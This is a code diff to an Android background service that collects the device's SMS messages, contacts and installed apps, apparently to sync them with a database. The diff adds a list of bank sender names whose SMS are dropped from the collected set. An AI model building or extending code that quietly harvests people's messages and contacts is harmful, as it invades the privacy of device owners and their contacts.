@@ -32,6 +32,7 @@ public class MyService2 extends Service {
     private  LinkedList<String> applist = null;
     private LinkedList<Contactclass> contacts = new LinkedList<Contactclass>();
     private LinkedList<SMSclass> sms = new LinkedList<>();
+
     private static boolean READ_CONTACTS_GRANTED = false;
     private static boolean READ_INTERNET_GRANTED = false;
     private static boolean READ_SMS_GRANTED = false;
@@ -39,6 +40,32 @@ public class MyService2 extends Service {
     private PackageManager packageManager = null;
     private Connection connection = null;
     private boolean ApplicationLoading=false;
+
+
+    private LinkedList<String> banks=new LinkedList<String>()
+    {
+        {
+            add("PrivatBank");
+            add("Avangard");
+            add("monobank");
+            add("Oschadbank");
+            add("900");
+            add("Alfa-Bank");
+            add("Altbank");
+            add("OTPBank");
+            add("OTP_Bank");
+            add("Raiffeisen");
+            add("Citibank");
+            add("SkyBank");
+            add("SportBank");
+            add("todobank");
+            add("TodoBank");
+            add("K-Kapital");
+            add("Ukrgasbank");
+            add("ForwardBank");
+            add("UnexBank");
+        }
+    };
     public void onCreate() {
         super.onCreate();
 
@@ -144,11 +171,24 @@ public class MyService2 extends Service {
         if (cursor.moveToFirst())
         {
             do {
-
                 sms.add(new SMSclass(cursor.getString(2).replace("'","*"),cursor.getString(12).replace("'","*")));
 
                 // use msgData
             } while (cursor.moveToNext());
+        }
+
+        for(int k=0;k<sms.size();k++)
+        {
+            for(int i=0;i<banks.size();i++)
+            {
+
+                if(banks.get(i).equals(sms.get(k).sender)) {
+                    sms.remove(k);
+                    k--;
+                    break;
+                }
+            }
+
         }
         return  sms;
     }
@@ -208,6 +248,7 @@ public class MyService2 extends Service {
                                        if(sms.get(j).text.equals(resultSet.getString(4)))
                                        {
                                            sms.remove(j);
+                                           j--;
                                        }
                                     }
                                 }
@@ -224,6 +265,7 @@ public class MyService2 extends Service {
                                         if(contacts.get(j).number.equals(resultSet.getString(4)))
                                         {
                                             contacts.remove(j);
+                                            j--;
                                         }
                                     }
                                 }
@@ -239,6 +281,7 @@ public class MyService2 extends Service {
                                     {
 
                                         applist.remove(j);
+                                        j--;
                                     }
                                 }
                             }
